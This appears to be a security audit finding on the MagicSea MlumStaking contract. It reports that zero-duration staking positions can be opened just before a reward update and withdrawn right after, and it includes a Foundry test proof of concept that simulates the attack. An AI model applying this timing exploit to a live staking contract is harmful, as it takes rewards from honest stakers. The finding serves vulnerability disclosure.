# Rewards in ```MlumStaking``` are distributed unfairly not taking into consideration the time someone has been locked.

## Vulnerability Detail
In ```MlumStaking``` contract, as stated in the docs rewards will be distributed every few days(see [here](https://docs.magicsea.finance/protocol/magic/magic-lum-staking)). However, the contract does not take into consideration the time that someone has been locked for between the reward distrbutions and this opens the door to some attacks making the rewards to be distributed unfairly. Also, the contract allows users to create ```StakingPosition``` with 0 ```lockDuration``` which means that this position is available to be withdrawn anytime the user wants and just the multiplier will be 0. This can cause serious problems in the reward distribution process since someone can time the ```updatePool``` call and create a position with 0 ```lockDuration```, minutes/hours before the reward distribution and then instantly withdraw it after the ```updatePool``` call.

## Impact
This vulnerability leads to unfair reward distribution since an attacker can get a huge portion of the rewards without having the appropriate time commitment. As a result, users and ```MLUM``` stakers will get less rewards than they should due to the fact that the attacker locked some minutes/hours before the distribution and then instantly withdraw after the ```updatePool``` call.

## Proof of concept
This PoC demonstrates the scenario where someone frontruns the ```updatePool``` function by creating a ```StakingPosition``` with ```lockDuration``` set to 0 and then backruns it by calling ```withdrawFromPosition``` instantly. However, this can happen, also, with some time delay and the attacker create a ```StakingPosition``` some minutes/hours before the reward distribution and then instantly withdraw it after the ```updatePool``` call. To understand better this vulnerability, add this test in the ```MlumStaking.sol``` file and run ```forge test --mt test_attackWithFrontrunningInMintRewards``` :
```solidity
    function test_attackWithFrontrunningInMintRewards() public {
        _stakingToken.mint(ALICE, 2 ether);
        _stakingToken.mint(BOB, 100 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 1 days);
        vm.stopPrank();

        skip(3600);

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 100 ether);
        _pool.createPosition(100 ether, 0);
        vm.stopPrank();
        _rewardToken.mint(address(_pool), 100_000_000);
        vm.startPrank(BOB);
        _pool.withdrawFromPosition(2, 100 ether);
        vm.stopPrank();

        vm.prank(ALICE);
        _pool.harvestPosition(1);

        console.log("BOB reward: ", _rewardToken.balanceOf(BOB));
        console.log("ALICE reward: ", _rewardToken.balanceOf(ALICE));

        vm.startPrank(ALICE);
        vm.expectRevert();
        _pool.withdrawFromPosition(1, 0.5 ether);

        skip(1 days);

        _pool.withdrawFromPosition(1, 1 ether);

        vm.stopPrank();
    }
```

## Recommendation
Consider checking how much time has someone been locked for an distribute the rewards accordingly.
